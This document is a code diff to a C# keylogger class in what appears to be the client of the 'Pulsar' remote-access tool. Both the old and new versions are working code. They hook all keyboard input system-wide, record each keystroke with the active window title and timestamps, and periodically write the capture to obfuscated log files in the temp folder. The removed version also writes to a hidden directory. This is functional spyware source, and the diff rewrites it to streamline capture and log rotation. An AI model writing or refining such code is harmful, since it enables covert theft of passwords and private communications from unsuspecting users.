@@ -1,95 +1,244 @@
 ﻿using Gma.System.MouseKeyHook;
-using Pulsar.Client.Config;
 using Pulsar.Client.Extensions;
 using Pulsar.Client.Helper;
 using Pulsar.Common.Helpers;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
-using System.Globalization;
 using System.IO;
 using System.Text;
+using System.Timers;
 using System.Windows.Forms;
 using Timer = System.Timers.Timer;
 
 namespace Pulsar.Client.Logging
 {
-    /// <summary>
-    /// This class provides keylogging functionality and modifies/highlights the output for
-    /// better user experience.
-    /// </summary>
     public class Keylogger : IDisposable
     {
-        /// <summary>
-        /// <c>True</c> if the class has already been disposed, else <c>false</c>.
-        /// </summary>
+        private readonly long _maxLogFileSize;
+        private readonly Timer _flushTimer;
+        private readonly object _syncLock = new object();
+        private readonly StringBuilder _currentBuffer = new StringBuilder();
+        private readonly IKeyboardMouseEvents _events;
+
+        private string _currentWindow = string.Empty;
+        private DateTime _lastWindowChange = DateTime.UtcNow;
+        private string _logFilePath;
+        private bool _isFirstWrite = true;
+        private readonly TimeSpan _windowChangeThreshold = TimeSpan.FromSeconds(1);
         public bool IsDisposed { get; private set; }
 
-        /// <summary>
-        /// The timer used to periodically flush the <see cref="_logFileBuffer"/> from memory to disk.
-        /// </summary>
-        private readonly Timer _timerFlush;
-
-        /// <summary>
-        /// The buffer used to store the logged keys in memory.
-        /// </summary>
-        private readonly StringBuilder _logFileBuffer = new StringBuilder();
-
-        /// <summary>
-        /// Temporary list of pressed keys while they are being processed.
-        /// </summary>
-        private readonly List<Keys> _pressedKeys = new List<Keys>();
-
-        /// <summary>
-        /// Temporary list of pressed keys chars while they are being processed.
-        /// </summary>
-        private readonly List<char> _pressedKeyChars = new List<char>();
-
-        /// <summary>
-        /// Saves the last window title of an application.
-        /// </summary>
-        private string _lastWindowTitle = string.Empty;
-
-        /// <summary>
-        /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
-        /// </summary>
-        private bool _ignoreSpecialKeys;
-
-        /// <summary>
-        /// Used to hook global mouse and keyboard events.
-        /// </summary>
-        private readonly IKeyboardMouseEvents _mEvents;
-
-        /// <summary>
-        /// The maximum size of a single log file.
-        /// </summary>
-        private readonly long _maxLogFileSize;
-
-        /// <summary>
-        /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
-        /// </summary>
-        /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
-        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
         public Keylogger(double flushInterval, long maxLogFileSize)
         {
             _maxLogFileSize = maxLogFileSize;
-            _mEvents = Hook.GlobalEvents();
-            _timerFlush = new Timer { Interval = flushInterval };
-            _timerFlush.Elapsed += TimerElapsed;
+            _events = Hook.GlobalEvents();
+            _logFilePath = GetLogFilePath();
+
+            _flushTimer = new Timer(flushInterval);
+            _flushTimer.Elapsed += TimerElapsed;
+            _flushTimer.AutoReset = true;
         }
 
-        /// <summary>
-        /// Begins logging of keys.
-        /// </summary>
         public void Start()
         {
             Subscribe();
-            _timerFlush.Start();
+            _flushTimer.Start();
         }
 
-        /// <summary>
-        /// Disposes used resources by this class.
-        /// </summary>
+        private void Subscribe()
+        {
+            _events.KeyDown += OnKeyDown;
+            _events.KeyPress += OnKeyPress;
+        }
+
+        private void Unsubscribe()
+        {
+            _events.KeyDown -= OnKeyDown;
+            _events.KeyPress -= OnKeyPress;
+        }
+
+        private void OnKeyDown(object sender, KeyEventArgs e)
+        {
+            string newWindow = NativeMethodsHelper.GetForegroundWindowTitle() ?? "Unknown Window";
+
+            lock (_syncLock)
+            {
+                bool windowChanged = newWindow != _currentWindow;
+                bool enoughTimePassed = DateTime.UtcNow - _lastWindowChange > _windowChangeThreshold;
+
+                // Check if window changed significantly
+                if (windowChanged && enoughTimePassed)
+                {
+                    _currentWindow = newWindow;
+                    _lastWindowChange = DateTime.UtcNow;
+
+                    // Start a fresh line for the new window
+                    if (_currentBuffer.Length > 0 && !_currentBuffer.ToString().EndsWith(Environment.NewLine))
+                        _currentBuffer.AppendLine();
+
+                    // Append window header cleanly
+                    _currentBuffer.AppendLine($"[{DateTime.UtcNow:HH:mm:ss}] {newWindow}");
+                }
+
+                HandleSpecialKey(e);
+            }
+        }
+
+        private void HandleSpecialKey(KeyEventArgs e)
+        {
+            switch (e.KeyCode)
+            {
+                case Keys.Enter:
+                    _currentBuffer.AppendLine();
+                    break;
+                case Keys.Back:
+                    HandleBackspace();
+                    break;
+                case Keys.Space:
+                    _currentBuffer.Append(' ');
+                    break;
+                case Keys.Tab:
+                    _currentBuffer.Append("\t");
+                    break;
+                case Keys.Escape:
+                    _currentBuffer.Append("[Esc]");
+                    break;
+                case Keys.Delete:
+                    _currentBuffer.Append("[Del]");
+                    break;
+                case Keys.Up:
+                case Keys.Down:
+                case Keys.Left:
+                case Keys.Right:
+                    // Ignore arrow keys to reduce noise
+                    break;
+                case Keys.LControlKey:
+                case Keys.RControlKey:
+                case Keys.LShiftKey:
+                case Keys.RShiftKey:
+                case Keys.LMenu:
+                case Keys.RMenu:
+                case Keys.LWin:
+                case Keys.RWin:
+                    // Ignore modifier keys alone
+                    break;
+                default:
+                    // Log function keys
+                    if (e.KeyCode >= Keys.F1 && e.KeyCode <= Keys.F24)
+                    {
+                        _currentBuffer.Append($"[{e.KeyCode}]");
+                    }
+                    break;
+            }
+        }
+
+        private void HandleBackspace()
+        {
+            if (_currentBuffer.Length > 0)
+            {
+                // Remove last character if it's not part of a window header
+                char lastChar = _currentBuffer[_currentBuffer.Length - 1];
+                if (lastChar != '\n' && lastChar != '\r' && lastChar != ']')
+                {
+                    _currentBuffer.Length--;
+                }
+            }
+        }
+
+        private void OnKeyPress(object sender, KeyPressEventArgs e)
+        {
+            lock (_syncLock)
+            {
+                if (!char.IsControl(e.KeyChar))
+                    _currentBuffer.Append(e.KeyChar);
+                else if (e.KeyChar == '\r') // Enter key
+                    _currentBuffer.AppendLine();
+            }
+        }
+
+        private void TimerElapsed(object sender, ElapsedEventArgs e)
+        {
+            try
+            {
+                FlushToFile();
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Keylogger flush error: {ex.Message}");
+            }
+        }
+
+        private void FlushToFile()
+        {
+            lock (_syncLock)
+            {
+                if (_currentBuffer.Length == 0) return;
+
+                string contentToWrite = _currentBuffer.ToString();
+                _currentBuffer.Clear();
+
+                WriteToFile(contentToWrite);
+            }
+        }
+
+        private void WriteToFile(string content)
+        {
+            if (string.IsNullOrWhiteSpace(content)) return;
+
+            try
+            {
+                // Write using the obfuscated log helper (handles compression + framing)
+                FileHelper.WriteObfuscatedLogFile(_logFilePath, content + Environment.NewLine);
+
+                // Check file size
+                FileInfo info = new FileInfo(_logFilePath);
+                if (info.Length > _maxLogFileSize)
+                {
+                    RotateLogFile();
+                }
+
+                _isFirstWrite = false; // mark that we’ve written at least once
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Log file write error: {ex.Message}");
+            }
+        }
+
+        private void RotateLogFile()
+        {
+            try
+            {
+                string baseName = DateTime.UtcNow.ToString("yyyy-MM-dd");
+                string basePath = Path.Combine(Path.GetTempPath(), baseName);
+                string newFilePath = basePath + ".txt";
+
+                int counter = 1;
+                while (File.Exists(newFilePath))
+                {
+                    newFilePath = $"{basePath}_{counter:00}.txt";
+                    counter++;
+                }
+
+                _logFilePath = newFilePath;
+                _isFirstWrite = true;
+            }
+            catch (Exception ex)
+            {
+                Debug.WriteLine($"Log rotation error: {ex.Message}");
+            }
+        }
+
+        private string GetLogFilePath()
+        {
+            return Path.Combine(Path.GetTempPath(), DateTime.UtcNow.ToString("yyyy-MM-dd") + ".txt");
+        }
+
+        public void FlushImmediately()
+        {
+            FlushToFile();
+        }
+
         public void Dispose()
         {
             Dispose(true);
@@ -98,269 +247,26 @@ namespace Pulsar.Client.Logging
 
         protected virtual void Dispose(bool disposing)
         {
-            if (IsDisposed)
-                return;
+            if (IsDisposed) return;
 
             if (disposing)
             {
-                Unsubscribe();
-                _timerFlush.Stop();
-                _timerFlush.Dispose();
-                _mEvents.Dispose();
-                WriteFile();
+                try
+                {
+                    FlushToFile();
+                    Unsubscribe();
+                    _flushTimer.Stop();
+                    _flushTimer.Dispose();
+                    _events.Dispose();
+                    _currentBuffer.Clear();
+                }
+                catch (Exception ex)
+                {
+                    Debug.WriteLine($"Dispose error: {ex.Message}");
+                }
             }
 
             IsDisposed = true;
-        }
-
-        /// <summary>
-        /// Subscribes to all key events.
-        /// </summary>
-        private void Subscribe()
-        {
-            _mEvents.KeyDown += OnKeyDown;
-            _mEvents.KeyUp += OnKeyUp;
-            _mEvents.KeyPress += OnKeyPress;
-        }
-
-        /// <summary>
-        /// Unsubscribes from all key events.
-        /// </summary>
-        private void Unsubscribe()
-        {
-            _mEvents.KeyDown -= OnKeyDown;
-            _mEvents.KeyUp -= OnKeyUp;
-            _mEvents.KeyPress -= OnKeyPress;
-        }
-
-        /// <summary>
-        /// Initial handling of the key down events and updates the window title.
-        /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key event args, e.g. the keycode.</param>
-        /// <remarks>This event handler is called first.</remarks>
-        private void OnKeyDown(object sender, KeyEventArgs e)
-        {
-            string activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
-            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != _lastWindowTitle)
-            {
-                _lastWindowTitle = activeWindowTitle;
-                _logFileBuffer.AppendLine();
-                _logFileBuffer.AppendLine();
-                _logFileBuffer.AppendLine($"[{activeWindowTitle} - {DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo)} UTC]");
-                _logFileBuffer.AppendLine();
-            }
-
-            if (_pressedKeys.ContainsModifierKeys())
-            {
-                if (!_pressedKeys.Contains(e.KeyCode))
-                {
-                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
-                    _pressedKeys.Add(e.KeyCode);
-                    return;
-                }
-            }
-
-            if (!e.KeyCode.IsExcludedKey())
-            {
-                // The key was not part of the keys that we wish to filter, so
-                // be sure to prevent a situation where multiple keys are pressed.
-                if (!_pressedKeys.Contains(e.KeyCode))
-                {
-                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
-                    _pressedKeys.Add(e.KeyCode);
-                }
-            }
-        }
-
-        /// <summary>
-        /// Processes pressed keys and appends them to the <see cref="_logFileBuffer"/>. Processing of Unicode characters starts here.
-        /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key press event args, especially the pressed KeyChar.</param>
-        /// <remarks>This event handler is called second.</remarks>
-        private void OnKeyPress(object sender, KeyPressEventArgs e)
-        {
-            if (_pressedKeys.ContainsModifierKeys() && _pressedKeys.ContainsKeyChar(e.KeyChar))
-                return;
-
-            if ((!_pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(_pressedKeyChars, e.KeyChar)) && !_pressedKeys.ContainsKeyChar(e.KeyChar))
-            {
-                var keyChar = e.KeyChar.ToString();
-                if (!string.IsNullOrEmpty(keyChar))
-                {
-                    Debug.WriteLine("OnKeyPress Output: " + keyChar);
-                    if (_pressedKeys.ContainsModifierKeys())
-                        _ignoreSpecialKeys = true;
-
-                    _pressedKeyChars.Add(e.KeyChar);
-                    _logFileBuffer.Append(keyChar);
-                }
-            }
-        }
-
-        /// <summary>
-        /// Finishes processing of the keys.
-        /// </summary>
-        /// <param name="sender">The sender of  the event.</param>
-        /// <param name="e">The key event args.</param>
-        /// <remarks>This event handler is called third.</remarks>
-        private void OnKeyUp(object sender, KeyEventArgs e)
-        {
-            _logFileBuffer.Append(FormatSpecialKeys(_pressedKeys.ToArray()));
-            _pressedKeyChars.Clear();
-        }
-
-        /// <summary>
-        /// Finds a held down key char in a given key char list.
-        /// </summary>
-        /// <param name="list">The list of key chars.</param>
-        /// <param name="search">The key char to search for.</param>
-        /// <returns><c>True</c> if the list contains the key char, else <c>false</c>.</returns>
-        private bool DetectKeyHolding(List<char> list, char search)
-        {
-            return list.FindAll(s => s.Equals(search)).Count > 1;
-        }
-
-        /// <summary>
-        /// Formats special keys as raw text without HTML formatting.
-        /// </summary>
-        /// <param name="keys">The input keys.</param>
-        /// <returns>The formatted special keys as raw text.</returns>
-        private string FormatSpecialKeys(Keys[] keys)
-        {
-            if (keys.Length < 1) return string.Empty;
-
-            string[] names = new string[keys.Length];
-            for (int i = 0; i < keys.Length; i++)
-            {
-                if (!_ignoreSpecialKeys)
-                {
-                    names[i] = keys[i].GetDisplayName();
-                    Debug.WriteLine("FormatSpecialKeys: " + keys[i] + " : " + names[i]);
-                }
-                else
-                {
-                    names[i] = string.Empty;
-                    _pressedKeys.Remove(keys[i]);
-                }
-            }
-
-            _ignoreSpecialKeys = false;
-
-            if (_pressedKeys.ContainsModifierKeys())
-            {
-                StringBuilder specialKeys = new StringBuilder();
-
-                int validSpecialKeys = 0;
-                for (int i = 0; i < names.Length; i++)
-                {
-                    _pressedKeys.Remove(keys[i]);
-                    if (string.IsNullOrEmpty(names[i])) continue; specialKeys.Append((validSpecialKeys == 0) ? $"[{names[i]}" : $" + {names[i]}");
-                    validSpecialKeys++;
-                }
-
-                // If there are items in the special keys string builder, give it an ending bracket
-                if (validSpecialKeys > 0)
-                    specialKeys.Append("]");
-
-                Debug.WriteLineIf(specialKeys.Length > 0, "FormatSpecialKeys Output: " + specialKeys.ToString());
-                return specialKeys.ToString();
-            }
-
-            StringBuilder normalKeys = new StringBuilder();
-
-            for (int i = 0; i < names.Length; i++)
-            {
-                _pressedKeys.Remove(keys[i]);
-                if (string.IsNullOrEmpty(names[i])) continue; switch (names[i])
-                {
-                    case "Return":
-                        normalKeys.AppendLine();
-                        normalKeys.Append("[Enter]");
-                        break;
-
-                    case "Escape":
-                        normalKeys.Append("[Esc]");
-                        break;
-
-                    default:
-                        normalKeys.Append($"[{names[i]}]");
-                        break;
-                }
-            }
-
-            Debug.WriteLineIf(normalKeys.Length > 0, "FormatSpecialKeys Output: " + normalKeys.ToString());
-            return normalKeys.ToString();
-        }
-
-        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
-        {
-            if (_logFileBuffer.Length > 0)
-                WriteFile();
-        }
-
-        /// <summary>
-        /// Writes the logged keys from memory to disk.
-        /// </summary>
-        private void WriteFile()
-        {
-            // TODO: Add some house-keeping and delete old log entries
-            bool writeHeader = false;
-
-            string filePath = Path.Combine(Settings.LOGSPATH, DateTime.UtcNow.ToString("yyyy-MM-dd"));
-
-            try
-            {
-                DirectoryInfo di = new DirectoryInfo(Settings.LOGSPATH);
-
-                if (!di.Exists)
-                    di.Create();
-
-                if (Settings.HIDELOGDIRECTORY)
-                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
-
-                int i = 1;
-                while (File.Exists(filePath))
-                {
-                    // Large log files take a very long time to read, decrypt and append new logs to,
-                    // so create a new log file if the size of the previous one exceeds _maxLogFileSize.
-                    long length = new FileInfo(filePath).Length;
-                    if (length < _maxLogFileSize)
-                    {
-                        break;
-                    }
-
-                    // append a number to the file name
-                    var newFileName = $"{Path.GetFileName(filePath)}_{i}";
-                    filePath = Path.Combine(Settings.LOGSPATH, newFileName);
-                    i++;
-                }
-
-                if (!File.Exists(filePath))
-                    writeHeader = true;
-
-                StringBuilder logFile = new StringBuilder(); if (writeHeader)
-                {
-                    logFile.AppendLine($"Log created on {DateTime.UtcNow.ToString("f", DateTimeFormatInfo.InvariantInfo)} UTC");
-                    logFile.AppendLine();
-                    _lastWindowTitle = string.Empty;
-                }
-
-                if (_logFileBuffer.Length > 0)
-                {
-                    logFile.Append(_logFileBuffer);
-                }
-
-                FileHelper.WriteObfuscatedLogFile(filePath, logFile.ToString());
-
-                logFile.Clear();
-            }
-            catch
-            {
-            }
-
-            _logFileBuffer.Clear();
         }
     }
 }
